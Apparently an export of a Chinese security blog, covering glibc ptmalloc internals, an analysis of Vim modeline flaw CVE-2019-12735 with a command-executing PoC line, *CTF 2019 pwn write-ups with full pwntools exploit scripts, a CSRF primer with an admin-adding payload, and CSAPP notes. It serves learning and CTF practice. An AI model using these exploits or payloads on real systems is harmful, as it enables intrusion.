(len) &#123; case 6: if (memcmp (envline, "CHECK_", 6) == 0) s = &amp;envline[7]; break; case 8: if (!__builtin_expect (__libc_enable_secure, 0)) &#123; if (memcmp (envline, "TOP_PAD_", 8) == 0) __libc_mallopt (M_TOP_PAD, atoi (&amp;envline[9])); else if (memcmp (envline, "PERTURB_", 8) == 0) __libc_mallopt (M_PERTURB, atoi (&amp;envline[9])); &#125; break; case 9: if (!__builtin_expect (__libc_enable_secure, 0)) &#123; if (memcmp (envline, "MMAP_MAX_", 9) == 0) __libc_mallopt (M_MMAP_MAX, atoi (&amp;envline[10])); else if (memcmp (envline, "ARENA_MAX", 9) == 0) __libc_mallopt (M_ARENA_MAX, atoi (&amp;envline[10])); &#125; break; case 10: if (!__builtin_expect (__libc_enable_secure, 0)) &#123; if (memcmp (envline, "ARENA_TEST", 10) == 0) __libc_mallopt (M_ARENA_TEST, atoi (&amp;envline[11])); &#125; break; case 15: if (!__builtin_expect (__libc_enable_secure, 0)) &#123; if (memcmp (envline, "TRIM_THRESHOLD_", 15) == 0) __libc_mallopt (M_TRIM_THRESHOLD, atoi (&amp;envline[16])); else if (memcmp (envline, "MMAP_THRESHOLD_", 15) == 0) __libc_mallopt (M_MMAP_THRESHOLD, atoi (&amp;envline[16])); &#125; break; default: break; &#125; &#125; &#125; if (s &amp;&amp; s[0]) &#123; __libc_mallopt (M_CHECK_ACTION, (int) (s[0] - '0')); if (check_action != 0) __malloc_check_init (); &#125; void (*hook) (void) = atomic_forced_read (__malloc_initialize_hook); if (hook != NULL) (*hook)(); __malloc_initialized = 1;&#125; 首先检查全局变量__malloc_initialized是否大于等于0.该值大于0,表示已经初始化完成;为0,表示正在初始化. 如果Glibc库不在默认名字空间,或是用户程序是静态编译的并调用了dlopen函数加载Glibc库中的ptmalloc_init(),这种情况下的ptmalloc不允许使用sbrk()分配内存,只需修改__morecore函数指针指向__failing_morecore就可以了,__morecore默认指向sbrk(). 然后将调用ptmalloc_init()的线程的thread_arena绑定到主分配区上.意味着本线程首选从主分配区分配内存.然后调用thread_atfork()设置当前进程在fork子线程时处理mutex的回调函数,在本进程fork子线程时,调用ptmalloc_lock_all()获得所有分配区的锁,禁止所有分配区分配内存,当子线程创建完毕,父进程调用ptmalloc_unlock_all()重新unlock每个分配区的锁mutex,子线程调用ptmalloc_unlock_all2()重新初始化每个分配区的锁mutex. 从环境变量中读取相应的配置参数值并调用mallopt()函数设置相应的选项.如果这段程序是在Glibc库初始化中执行的,会做更多的安全检查工作. 在ptmalloc_init()函数结束处,查看是否存在__malloc_initialize_hook函数,如果存在,执行该hook函数. 最后将全局变量__malloc_initialized设置为1,表示ptmalloc_init()已经初始化完成. 子线程的内存分配123456789101112131415161718192021222324static void ptmalloc_lock_all (void) &#123; mstate ar_ptr; if (__malloc_initialized &lt; 1) return; if (mutex_trylock (&amp;list_lock)) &#123; if (thread_arena == ATFORK_ARENA_PTR) goto out; (void) mutex_lock (&amp;list_lock); &#125; for (ar_ptr = &amp;main_arena;; ) &#123; (void) mutex_lock (&amp;ar_ptr-&gt;mutex); ar_ptr = ar_ptr-&gt;next; if (ar_ptr == &amp;main_arena) break; &#125; save_malloc_hook = __malloc_hook; save_free_hook = __free_hook; __malloc_hook = malloc_atfork; __free_hook = free_atfork; save_arena = thread_arena; thread_arena = ATFORK_ARENA_PTR;out: ++atfork_recursive_cntr;&#125; 当父进程中的某个线程使用fork的机制创建子线程时,首先调用ptmalloc_lock_all()函数暂时对全局锁list_lock和所有的分配区加锁,从而保证分配区状态的一致性. ptmalloc_lock_all()函数首先检查ptmalloc是否已经初始化,如果没有初始化,退出. 然后尝试对全局锁list_lock加锁,直到获得全局锁list_lock对所有的分配区加锁.接着保存原有的分配释放函数,将malloc_atfork()和free_atfork()函数作为fork子线程期间所使用的内存分配释放函数,然后保存当前线程的私有实例中的原有分配区指针,将ATFORK_ARENA_PTR存放到当前线程的私有实例中,用于标识当前现在正在fork子线程. 对全局变量atfork_recursive_cntr加1,表示递归fork子线程的层数,保证父线程在fork子线程过程中,调用ptmalloc_unlock_all()函数加锁的次数与调用ptmalloc_lock_all()函数解锁的次数保持一致,同时也保证保证所有的子线程调用ptmalloc_unlock_all()函数加锁的次数与父线程调用ptmalloc_lock_all()函数解锁的次数保持一致,防止没有释放锁. 1234567891011121314151617static void ptmalloc_unlock_all (void) &#123; mstate ar_ptr; if (__malloc_initialized &lt; 1) return; if (--atfork_recursive_cntr != 0) return; thread_arena = save_arena; __malloc_hook = save_malloc_hook; __free_hook = save_free_hook; for (ar_ptr = &amp;main_arena;; ) &#123; (void) mutex_unlock (&amp;ar_ptr-&gt;mutex); ar_ptr = ar_ptr-&gt;next; if (ar_ptr == &amp;main_arena) break; &#125; (void) mutex_unlock (&amp;list_lock);&#125; 当进程的某个线程完成fork子线程后,父线程和子线程都调用ptmall_unlock_all()函数释放全局锁list_lock,释放所有分配区的锁. ptmall_unlock_all()函数首先检查ptmalloc是否初始化,如果没有初始化,退出. 接着将全局变量atfork_recursive_cntr减1,如果atfork_recursive_cntr为0,才继续执行,这保证了递归fork子线程只会解锁一次. 接着将当前线程的私有实例还原为原来的分配区,__malloc_hook和__free_hook还原为由来的hook函数.然后遍历所有分配区,依次解锁每个分配区,最后解锁list_lock. 123456789101112131415161718192021222324252627282930# ifdef __linux__static void ptmalloc_unlock_all2 (void) &#123; mstate ar_ptr; if (__malloc_initialized &lt; 1) return; thread_arena = save_arena; __malloc_hook = save_malloc_hook; __free_hook = save_free_hook; mutex_init (&amp;free_list_lock); if (save_arena != NULL) ((mstate) save_arena)-&gt;attached_threads = 1; free_list = NULL; for (ar_ptr = &amp;main_arena;; ) &#123; mutex_init (&amp;ar_ptr-&gt;mutex); if (ar_ptr != save_arena) &#123; ar_ptr-&gt;attached_threads = 0; ar_ptr-&gt;next_free = free_list; free_list = ar_ptr; &#125; ar_ptr = ar_ptr-&gt;next; if (ar_ptr == &amp;main_arena) break; &#125; mutex_init (&amp;list_lock); atfork_recursive_cntr = 0;&#125;# else# define ptmalloc_unlock_all2 ptmalloc_unlock_all# endif 函数ptmalloc_unlock_all2()被fork出的子线程调用,在Linux系统中,子线程(进程)unlock从父线程(进程)中继承的mutex不安全,会导致资源泄漏,但重新初始化mutex是安全的,所有增加了这个特殊版本用于Linux下的atfork handler. ptmalloc_unlock_all2()使用mutex_init()代替了mutex_unlock(),对于子线程来说,无论全局变量atfork_recursive_cntr的值是多少,都将该值设置为0,因为ptmalloc_unlock_all2()函数只会被子线程调用一次. 123456789101112131415161718192021# define ATFORK_ARENA_PTR ((void *) -1)static void * malloc_atfork (size_t sz, const void *caller) &#123; void *victim; if (thread_arena == ATFORK_ARENA_PTR) &#123; if (save_malloc_hook != malloc_check) &#123; return _int_malloc (&amp;main_arena, sz); &#125; else &#123; if (top_check () &lt; 0) return 0; victim = _int_malloc (&amp;main_arena, sz + 1); return mem2mem_check (victim, sz); &#125; &#125; else &#123; (void) mutex_lock (&amp;list_lock); (void) mutex_unlock (&amp;list_lock); return __libc_malloc (sz); &#125;&#125; 当父进程中的某个线程使用fork的机制创建子线程时,如果进程中的线程需要分配内存,将使用malloc_atfork()函数分配内存. malloc_atfork()函数首先查看自己的线程私有实例中的分配区指针,如果该指针为ATFORK_ARENA_PTR,意味着本线程正在fork新线程,并锁住了全局锁list_lock和每个分配区,如果在fork线程的分配函数不是处于check模式,直接调用内部分配函数_int_malloc().否则在分配内存的同时做检查. 如果线程私有实例中的指针不是ATFORK_ARENA_PTR,意味着有另外的线程在fork子线程,当前线程只能等待fork子线程的线程完成分配,于是等待获得全局锁list_lock,如果获得全局锁成功,表示fork子线程的线程已经完成fork操作,释放全局锁list_lock并调用__libc_malloc()分配内存. 12345678910111213static void free_atfork (void *mem, const void *caller) &#123; mstate ar_ptr; mchunkptr p; if (mem == 0) return; p = mem2chunk (mem); if (chunk_is_mmapped (p)) &#123; munmap_chunk (p); return; &#125; ar_ptr = arena_for_chunk (p); _int_free (ar_ptr, p, thread_arena == ATFORK_ARENA_PTR);&#125; 当父进程中的某个线程使用fork的机制创建子线程时,如果进程中的线程需要释放内存,将使用free_atfork()函数释放内存. free_atfork()函数首先通过需free的内存块指针获得chunk的指针,如果该chunk是通过mmap分配的,调用munmap()释放该chunk. 否则先根据chunk指针获得分配区指针,然后调用_int_free()函数(参数中有本线程是否正在fork新线程). 多分配区支持非主分配区使用mmap()函数分配内存来模拟堆(sub-heap),所有的从非主分配区总分配的小内存块都从sub-heap中切分出来,如果一个sub-heap的内存用光了,或是sub-heap中的内存不够用时,使用mmap()分配一块新的内存块作为sub-heap,并将新的sub-heap链接在非主分配区中sub-heap的单向链表中. 非主分配区中的sub-heap同样会进行收缩,将sub-heap中top chunk的一部分返回给操作系统,如果top chunk为整个sub-heap,会把整个sub-heap还回给操作系统.收缩堆的条件是当前free的chunk大小加上前后能合并chunk的大小大于64KB,并且top chunk的大小达到mmap收缩阈值,才有可能收缩堆. 为了保证分配区的线程安全,对分配区的访问需要锁保护,当线程获得分配区的锁时,可以使用该分配区分配内存,并将该分配区的指针保存在线程的私有实例中. 线程需要调用malloc分配内存空间时,该线程先查看线程私有变量中是否已经存在一个分配区,如果存在,尝试对该分配区加锁,如果加锁成功,使用该分配区分配内存,如果失败,该线程搜分配区索循环链表试图获得一个空闲的分配区.如果所有的分配区都已经加锁,那么malloc会开辟一个新的分配区,把该分配区加入到分配区的全局分配区循环链表并加锁,然后使用该分配区进行分配操作,如果不能开辟新的分配区则等待.在回收操作中,线程同样试图获得待回收块所在分配区的锁,如果该分配区正在被别的线程使用,则需要等待直到其他线程释放该分配区的互斥锁之后才可以进行回收操作. 分配区初始化ptmalloc定义了如下几个全局变量. 1234567891011121314151617181920static struct malloc_state main_arena =&#123; .mutex = _LIBC_LOCK_INITIALIZER, .next = &amp;main_arena, .attached_threads = 1&#125;;static struct malloc_par mp_ =&#123; .top_pad = DEFAULT_TOP_PAD, .n_mmaps_max = DEFAULT_MMAP_MAX, .mmap_threshold = DEFAULT_MMAP_THRESHOLD, /*128k*/ .trim_threshold = DEFAULT_TRIM_THRESHOLD, /*128k*/#define NARENAS_FROM_NCORES(n) ((n) * (sizeof (long) == 4 ? 2 : 8)) .arena_test = NARENAS_FROM_NCORES (1)&#125;;static INTERNAL_SIZE_T global_max_fast; main_arena表示主分配区,任何进程有且仅有一个全局的主分配区,mp_是全局唯一的一个malloc_par实例,用于管理参数和统计信息,global_max_fast全局变量表示fast bins中最大的chunk大小. 分配区初始化函数. 12345678910111213141516static void malloc_init_state (mstate av) &#123; int i; mbinptr bin; for (i = 1; i &lt; NBINS; ++i) &#123; bin = bin_at (av, i); bin-&gt;fd = bin-&gt;bk = bin; &#125;#if MORECORE_CONTIGUOUS if (av != &amp;main_arena)#endif set_noncontiguous (av); if (av == &amp;main_arena) set_max_fast (DEFAULT_MXFAST); av-&gt;flags |= FASTCHUNKS_BIT; av-&gt;top = initial_top (av);&#125; 初始化函数首先遍历所有的bins,初始化每个bin的空闲链表为空,即将bin的fb和bk都指向bin本身. 由于av中所有字段默认为0,即默认分配连续的虚拟地址空间,但只有主分配区才能分配连续的虚拟地址空间,所以对于非主分配区,需要设置为分配非连续虚拟地址空间. 如果初始化的是主分配区,需要设置fast bins中最大chunk大小,由于主分配区只有一个,并且一定是最先初始化,这就保证了对全局变量global_max_fast只初始化了一次,只要该全局变量的值非0,也就意味着主分配区初始化了.然后标识此时分配区无fast bins. 最后初始化top chunk.对top chunk的初始化即暂时把top chunk初始化为unsort chunk,仅仅是初始化一个值而已,这个chunk的内容肯定不能用于top chunk来分配内存,主要原因是top chunk不属于任何bin,但ptmalloc中的一些check代码,可能需要top chunk属于一个合法的bin. 获取分配区为了支持多线程,ptmalloc定义了如下的全局变量. 12345678910static __thread mstate thread_arena attribute_tls_model_ie;static mutex_t list_lock = _LIBC_LOCK_INITIALIZER;static mutex_t free_list_lock = _LIBC_LOCK_INITIALIZER;static size_t narenas = 1;static mstate free_list;static unsigned long arena_mem;int __malloc_initialized = -1; thread_arena存放的是线程的私用实例,该私有实例保存的是分配区(arena)的malloc_state实例的指针.thread_arena指向的可能是主分配区的指针,也可能是非主分配区的指针. list_lock用于同步分配区的单向环形链表. narenas全局变量表示当前分配区的数量,free_list全局变量是空闲分配区的单向链表,这些空闲的分配区可能是从父进程那里继承来的. arena_mem记录了非主分配区所分配的内存大小. __malloc_initializd全局变量用来标识是否ptmalloc已经初始化了,其值大于0时表示已经初始化. ptmalloc使用如下的宏来获得分配区. 1234567891011#define arena_get(ptr, size) do &#123; \ ptr = thread_arena; \ arena_lock (ptr, size); \ &#125; while (0)#define arena_lock(ptr, size) do &#123; \ if (ptr &amp;&amp; !arena_is_corrupt (ptr)) \ (void) mutex_lock (&amp;ptr-&gt;mutex); \ else \ ptr = arena_get2 ((size), NULL); \ &#125; while (0) arena_get获取线程的私有实例中的分配区指针,可能为NULL,然后调用arena_lock. arena_lock如果存在分配区指针且不冲突则直接对该分配区加锁,否则加锁失败调用arena_get2.]]></content>
      <categories>
        <category>binary</category>
        <category>源码分析</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[binary-漏洞分析-Linux-escape-pwn-CVE-2019-12735]]></title>
    <url>%2Fposts%2F943ea10d%2F</url>
    <content type="text"><![CDATA[0x00CVE-2019-12735,环境Vim &lt; 8.1.1365,Neovim &lt; 0.3.6.启用modeline模式. modeline详解vim共有4种模式:正常模式,插入模式,命令模式,可视模式. 启动vim时,当前用户根目录下的.vimrc配置文件会被自动加载,~/.vimrc中的设置会对打开的所有文件生效,不便于个性化设置. vim的modeline可以针对每个文件进行文件级别的设置,这些设置是覆盖.vimrc中的设置的.vim默认关闭modeline,在.vimrc末尾追加set modeline即可打开. 如果modeline打开,vim在打开文件时会解析文件开头及末尾符合一定格式的设置行.为了安全考虑,在modeline的设置中只支持set命令.具体参考:https://vimjc.com/vim-modeline.html. 但是foldexpr,formatexpr,includeexpr,indentexpr,statusline,foldtext等选项的值可以是一个表达式,如果选项是在modeline中设置,表达式在沙箱中执行.沙箱实质上就是对表达式所能实现的功能做了限制,如在沙箱中不能执行shell命令,不能读写文件,不能修改缓冲区等等. vim的沙箱检查函数check_secure()在libcall,luaeval等危险指令的开头进行沙箱检查,如果发现在沙箱中调用,直接return掉. CVE-2019-1273512345Product: Vim &lt; 8.1.1365, Neovim &lt; 0.3.6Type: Arbitrary Code ExecutionCVE: CVE-2019-12735Date: 2019-06-04Author: Arminius (@rawsec) 问题来源于命令source. 123:so[urce]! &#123;file&#125; Read Vim commands from &#123;file&#125;. These are commands that are executed from Normal mode, like you type them. 构造PoC,将待执行的命令放在text部分,so[urce]! %加载当前文件. 1[text]&#123;white&#125;&#123;vi:|vim:|ex:&#125;[white]&#123;options&#125; 1:!uname -a||" vi:fen:fdm=expr:fde=assert_fails("source\!\ \%"):fdl=0:fdt=" 补丁对source指令添加了沙箱检查. 参考链接https://github.com/numirias/security/blob/master/doc/2019-06-04_ace-vim-neovim.md. https://paper.seebug.org/952.]]></content>
      <categories>
        <category>binary</category>
        <category>漏洞分析</category>
      </categories>
      <tags>
        <tag>escape-pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[writeup-starctf-2019-pwn]]></title>
    <url>%2Fposts%2F708790b2%2F</url>
    <content type="text"><![CDATA[blindpwn题目信息. 123456789101112checksec:Arch: amd64-64-littleRELRO: Partial RELROStack: No canary foundNX: NX enabledPIE: No PIE (0x400000)file libc:libc-2.23.so: ELF 64-bit LSB shared object, x86-64, version 1 (GNU/Linux), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=b5381a457906d279073822a5ceb2 尝试发现有栈溢出漏洞,重复测试测出偏移,寻找useful gadget. 123456789101112131415161718192021222324252627282930313233from pwn import *context.log_level = 'debug'offset = 0x28padding = "a" * offsetaddrs = []def find_gadget(addr): fd = open("gadget.txt", 'a') fd.write(hex(addr) + '\n') fd.close()for addr in range(0x4008df, 0x401AA0, 0x1): r = remote("34.92.37.22", 10000) r.recvuntil("Welcome to this blind pwn!\n") payload = padding + p64(addr) log.info("now addr is " + hex(addr)) r.send(payload) try: msg = r.recvrepeat(12) if(msg != ""): log.success("find addr " + hex(addr)) print msg find_gadget(addr) addrs.append(addr) r.close() except EOFError as e: r.close() log.info("connection close at " + hex(addr))print addrs 发现有个地方是泄露加重放漏洞,写出exp. 1234567891011121314151617181920from pwn import *context.log_level = 'debug'offset = 0x28padding = "a" * offsetmain = 0x400570r = remote("34.92.37.22", 10000)r.recvuntil("Welcome to this blind pwn!\n")payload = padding + p64(0x400515) + p64(main)r.send(payload)libc = u64(r.recvuntil("Welcome to this blind pwn!\n")[0x48 : 0x4e].ljust(8, '\0')) - 0x20830print "libc " + hex(libc)payload = padding + p64(libc + 0x4526a) + p64(0) * 0x30r.send(payload)r.interactive() girlfriend利用tcache容量限制绕过. 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394from pwn import *def change_ld(binary, ld): binary = ELF(binary) for segment in binary.segments: if segment.header['p_type'] == 'PT_INTERP': size = segment.header['p_memsz'] addr = segment.header['p_paddr'] data = segment.data() if size &lt;= len(ld): log.failure("Failed to change PT_INTERP from &#123;&#125; to &#123;&#125;".format(data, ld)) return None binary.write(addr, ld.ljust(size, '\0')) if not os.access('/tmp/pwn', os.F_OK): os.mkdir('/tmp/pwn') path = '/tmp/pwn/&#123;&#125;_debug'.format(os.path.basename(binary.path)) if os.access(path, os.F_OK): os.remove(path) info("Removing exist file &#123;&#125;".format(path)) binary.save(path) os.chmod(path, 0b111000000) return ELF(path)context.log_level = 'debug'r = remote("34.92.96.238", "10001")#elf = change_ld('./chall', './ld-2.29.so')#r = elf.process(env = &#123;'LD_PRELOAD' : './libc.so.6'&#125;)def add(size, content, call): r.sendline("1") r.recvuntil("of girl's name\n") r.sendline(str(size)) r.recvuntil("her name:\n") r.sendline(content) r.recvuntil("input her call:\n") r.sendline(call) r.recvuntil("Input your choice:")def show(index): r.sendline("2") r.recvuntil("the index:\n") r.sendline(str(index)) data = r.recvuntil("Input your choice:") print data return datadef call(index): r.sendline("4") r.recvuntil("the index:\n") r.sendline(str(index)) r.recvuntil("Input your choice:")r.recvuntil("Input your choice:")add(0x500, "/bin/sh\x00", "/bin/sh\x00")#0i = 1while(i &lt; 10): i += 1 add(0x60, "/bin/sh\x00", "/bin/sh\x00")#1-9add(0x100, "/bin/sh\x00", "/bin/sh\x00")#10call(0)libc = u64(show(0)[6:12].ljust(8, '\0')) - 0x3b1ca0i = 1while(i &lt; 10): call(i) i += 1call(8)ptr = libc + 0x3b38c8 - 0x13i = 1while(i &lt; 8): i += 1 add(0x60, "/bin/sh\x00", "/bin/sh\x00")#1-9add(0x60, p64(ptr), p64(ptr))#11add(0x60, p64(ptr), p64(ptr))#12add(0x60, p64(ptr), p64(ptr))#13add(0x60, "\x00" * 0x13 + p64(libc + 0x41c30), "a" * 10)#13#gdb.attach(r)print "libc: " + hex(libc)r.sendline("4")r.recvuntil("the index:\n")r.sendline(str(10))r.interactive() change_ld修改elf文件的PT_INTERP. 1234567891011121314151617181920212223242526272829from pwn import *def change_ld(binary, ld): if not os.access(ld, os.R_OK): log.failure("Invalid path &#123;&#125; to ld".format(ld)) return None if not isinstance(binary, ELF): if not os.access(binary, os.R_OK): log.failure("Invalid path &#123;&#125; to binary".format(binary)) return None binary = ELF(binary) for segment in binary.segments: if segment.header['p_type'] == 'PT_INTERP': size = segment.header['p_memsz'] addr = segment.header['p_paddr'] data = segment.data() if size &lt;= len(ld): log.failure("Failed to change PT_INTERP from &#123;&#125; to &#123;&#125;".format(data, ld)) return None binary.write(addr, ld.ljust(size, '\0')) if not os.access('/tmp/pwn', os.F_OK): os.mkdir('/tmp/pwn') path = '/tmp/pwn/&#123;&#125;_debug'.format(os.path.basename(binary.path)) if os.access(path, os.F_OK): os.remove(path) info("Removing exist file &#123;&#125;".format(path)) binary.save(path) os.chmod(path, 0b111000000) success("PT_INTERP has changed from &#123;&#125; to &#123;&#125;. Using temp file &#123;&#125;".format(data, ld, path)) return ELF(path) 参考:https://bbs.pediy.com/thread-225849.htm. quicksort123456789101112131415161718192021222324252627282930313233343536from pwn import *context.log_level = 'debug'r = remote("34.92.96.238", "10000")#r = process("./quicksort")r.recvuntil("how many numbers do you want to sort?\n")r.sendline("2")i = 1r.recvuntil("the " + str(i) + "th number:")payload = "134515285" + "a" * 7 + p32(0x8048a53 + 3) + p32(0x8048a53) + p32(0x8048a53 + 3) + p32(0x804A020 - 0x8048a53 * 4 + 0x100000000)r.sendline(payload)i = 134515285r.recvuntil("the " + str(i) + "th number:")payload = "13451529" + p32(0x8048530) + p32(0x01010101) + p32(0x8048a53 + 3) + p32(0x8048a53) + p32(0x8048a53 + 3) + p32(0x804A038 - 0x8048a53 * 4 + 0x100000000) + p32(0x01010101) + p32(0x8048a5a)payload += p32(0x8048560) + p32(0x8048a5a) + p32(0x804A02C) + p32(0x01010101)#leakpayload += p32(0x8048500) + p32(0x8048a5a) + p32(0x804A034) + p32(0x804A034)#getspayload += p32(0x8048580) + p32(0x8048a5a) + p32(0x804A038)#getshell#gdb.attach(r)r.sendline(payload)r.recvuntil("the " + str(i) + "th number:")r.send("\n")libc = u32(r.recv()[:4]) - 0x5fca0r.sendline(p32(libc + 0x3ada0) + "/bin/sh\x00")r.interactive()]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>Jeopardy</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[web安全-CSRF-基础]]></title>
    <url>%2Fposts%2F84842144%2F</url>
    <content type="text"><![CDATA[概览Cross-Site Request Forgery跨站请求伪造. 被攻击者的浏览器被迫向目标站点发起了伪造的请求,这个过程会带上被攻击者的身份验证标识(session)以通过目标站点的验证.从而借用被攻击者在目标站点上的权限进行一系列不被期望的操作. 被攻击者登录网站之后本地存在cookie,在会话维持期间访问hack控制的网站,hack利用被攻击者的身份来做一些操作. session机制会话是客户端与服务端间通信的一种方式.早期,客户端与服务端之间的每次信息传递都是独立的(HTTP协议是无状态的).对于无状态的HTTP协议,人们提出两种解决方案,Cookie和Session. Cookie机制. 一般来说,Cookie分发是通过扩展HTTP协议来实现的,服务器通过在HTTP的响应头中加上指示以提示浏览器生成相应的Cookie.纯粹的客户端脚本如JavaScript也可以生成Cookie. Cookie相当于由用户自己保存的一张纸,上面记载着用户的信息.比如用户名,密码等等.Cookie一般是由浏览器在后台自动发送给服务器的.浏览器会检查所有的Cookie,当某个Cookie的作用域大于或等于所要访问的资源的位置时,浏览器就会把这个Cookie附在请求资源的HTTP请求头上发送给服务器.这种方式就是客户端在维持状态. Session机制. Session相当于会员卡,上面除了Session ID什么都没有.客户端请求服务端时,服务端会检查请求中是否包含Session ID.当存在Session ID时就检索出相应的Session.不存在则创建一个Session并生成一个Session ID. Session ID的值应该是一个既不会重复,又不容易被找到规律以仿造的字符串.这种方式就是服务端在维持状态. Session机制中用户的状态由服务端来维持,但Session ID要用户自己来保管的,而一般来说,Session ID则以Cookie的形式保存在客户端. 但这种方式有一个弊端就是如果客户端禁用了Cookie,那么Session机制将无法正常工作.解决这个问题有两种方法,一种是URL重写,即将Session ID作为URL的附加信息或参数.另一种是将Session ID写在表单的隐藏域中,在表单提交时将Session ID一起提交上去. CSRF攻击XSS:构造代码 → 伪装代码 → 发送给受害者 → 受害者打开 → 攻击者获取受害者的Cookie → 攻击者使用受害者的Cookie去干坏事 → 攻击完成. CSRF:构造代码 → 伪装代码 → 发送给受害者 → 受害者打开 → 受害者执行了恶意代码 → 攻击完成. XSS是攻击者获取到了受害者的Cookie,攻击者去执行恶意代码操作,而CSRF则是受害者在打开攻击者的代码时,攻击就已经完成了,一次CSRF攻击就完成了.简单的说,XSS是盗取Cookie,CSRF是盗用Session. payload举例:&lt;img src=http://www.a.com/admin/adduser.php?username=abc&amp;password=123&gt;. 常见漏洞类型GET请求,且请求中没有token验证参数,还有一个固定的变量可以被控制. POST请求,且POST请求中没有token参数,也没有验证referer信息. POST请求,且POST请求中没有token参数,但是验证referer信息,可以将POST请求改写为GET请求(前提是后端没有严格的用$_POST而是用的类似于$_REQUEST的写法). CSRF的防御检查HTTP Referer字段是否同域,但存在以下问题:只能防御来自站外的CSRF;从HTTPS站点发送请求到HTTP站点时,浏览器不发送Referer;Referer可以在服务端被伪造,即可以被向可信站点A发送请求的危险站点B伪造从而通过检查机制. 使用验证码:这种方式会降低用户的使用体验,给用户带来不便. 限制Session Cookie的生存周期:即规定如果用户在一段时间内不进行任何操作,服务端就自动销毁Session. 使用一次性Token目前最广泛使用的解决方案.Token是一个由数字,字母组成的随机值,每次生成的Token必须具有唯一性且不易被猜测到. 在用户登录后,服务端会生成一个一次性的Token,一般Token会保存在服务端返回给用户的页面中的一个隐藏域里.每次用户向服务端发送操作请求时会附带上这个Token,服务端也会验证这个Token是否和分发给用户的Token一致,如果请求中不存在Token或Token不正确,即判定这个请求为非法请求. 这个解决方案的原理就是利用了浏览器的同源策略,即第三方无法通过AJAX等方式获取到Token值.但这种Token不具备时效性.可以使用一个临时的作用在父子页面之间的Cookie来代替Token.]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>CSRF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CS-basis-CSAPP-处理器体系结构]]></title>
    <url>%2Fposts%2F6b499301%2F</url>
    <content type="text"><![CDATA[概念一个处理器能够处理的指令集合及其涉及的指令格式,寻址方式,操作数的定义,操作数所存放的寄存器以及存储器的相关规定就是处理器的指令体系结构(ISA). ISA在编译器编写者和处理器设计人员之间提供了一个概念抽象层.按ISA复杂程度有复杂指令集计算机(CISC,如IA-32)和精简指令集计算机(RISC,如MIPS,ARM). 程序的执行程序运行的实质就是cpu不断读取内存中的指令对其译码并执行. cpu取出并执行一条指令的时间称为指令周期,不同指令指令周期不同,执行一条指令的过程可以分为取指,译码,执行操作(可能包括取操作数和存储结果),计算下一条指令地址. 取指:cpu根据PC(程序计数器)的值获取最长指令字节数的比特流送给IR(指令寄存器). 译码:由ID对IR中的指令操作码进行译码. 执行:有操作数则先根据寻址方式获取操作数地址从而获取源操作数或修改目的操作数(也就是访存与写回). PC更新:顺序执行时只需要让PC加当前指令长度即可,如果有转移类指令就需要计算(执行操作)得到. CPUcpu最基本的部件是数据通路和控制部件. 数据通路的作用就是传输比特流(包括数据,地址和指令). 控制部件包括ALU,通用寄存器和状态寄存器,程序计数器PC(也称为IP,指令指针寄存器),指令寄存器IR,指令译码器ID,脉冲源及启停控制逻辑(具体参考数字电路),时序信号产生部件(产生不同指令对应的时序信号),操作控制信号的形成部件,总线控制逻辑和中断机构. 中断机制cpu从加电开始不断的执行指令(伴随PC的更改)直到遇到特殊情况无法继续执行. 非法操作码 Segmentation fault和Page fault. 运算错误,例如溢出和除零. 外部中断,一般源于IO机制. 面对这些情况cpu有专门的处理机制,称为异常处理或者中断机制.相应的逻辑称为中断机构. 流水线流水线是基于CPU再执行一条指令时使用了不同的部分,也就是当第一条指令执行到下一阶段时,执行第二条指令的此阶段,以此类推.这样的要求就是需要流水线寄存器来储存中间过程的输出(这也是有时延的,所以流水线划分时阶段不是越多越好). 前面的方案忽略了指令之间的相互影响,而实际上指令之间存在互相影响,所以就要流水线控制逻辑来纠正这种影响带来的错误.具体待以后详细补充.]]></content>
      <categories>
        <category>CS</category>
        <category>basis</category>
      </categories>
      <tags>
        <tag>CSAPP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CS-basis-CSAPP-链接]]></title>
    <url>%2Fposts%2Fb9754563%2F</url>
    <content type="text"><![CDATA[概览高级语言源程序文件转换为可执行文件通常分为预处理,编译,汇编,链接四个步骤,前三个步骤的最终结果为可重定位目标文件(GCC的.o,VC的.obj,不同编译器驱动程序大同小异). 链接是将多个文件代码和数据按照一定方式合并成一个可执行目标文件的过程.链接根据发生的时间段(编译时,加载时和运行时)可以分为静态链接和动态链接. 目标文件目标文件有三种形式. 可重定位目标文件(relocatable file):包含二进制代码和数据,可以在编译时与其他重定位目标文件合并生成一个可执行目标文件. 共享目标文件(shared object file):一种特殊类型的可重定位目标文件,可以在使用其的程序加载或运行时被动态链接进内存. 可执行目标文件(executable file):包含二进制代码和数据,可以直接被加载并执行. 不同系统的目标文件格式不一定相同,最早的a.out,现代的PE,ELF,Mach-O等等.此文以ELF为例. 可重定位目标文件 .test:机器代码. .rodata:只读数据,例如常量字符串,开关语句(switch)的跳转表. .data:存放已初始化的全局和静态变量. .bss:存放未初始化的全局和静态变量,以及所有初始化为0的全局或静态变量,该节不占目标文件磁盘空间. .symtab:符号表,存放符号相关的信息,拥有全局生命周期的变量名与函数名都属于符号.(每个可重定位目标文件都有) .rel.text:存放代码的重定位条目. .rel·data:存放已初始化数据的重定位条目. .debug:调试符号表,gcc使用-g选项生成,其中包括局部变量. .line:源代码中行号和机器指令间的映射,生成方式同上. .strtab:字符串表,包含.symtab和.debug节以及节头表中引用的字符串,是以\0为结尾的字符串序列. 常见的还有以下特殊节. .comment:版本控制信息. .dynamic:动态连接信息. .dynstr:动态连接字符串. .dynsym:动态连接符号表. .got:全局偏移量表. .hash:符号哈希表. .interp:ELF程序解析器的路径名. .plt:函数连接表. .shstrtab:节名字表. 非静态局部变量是运行时由栈管理的,所以链接时不需要保存符号信息. 可执行目标文件典型的ELF可执行文件. 32位Linux下进程空间排布示例. .init:定义了一个_init用于可执行目标文件开始执行的初始化工作. 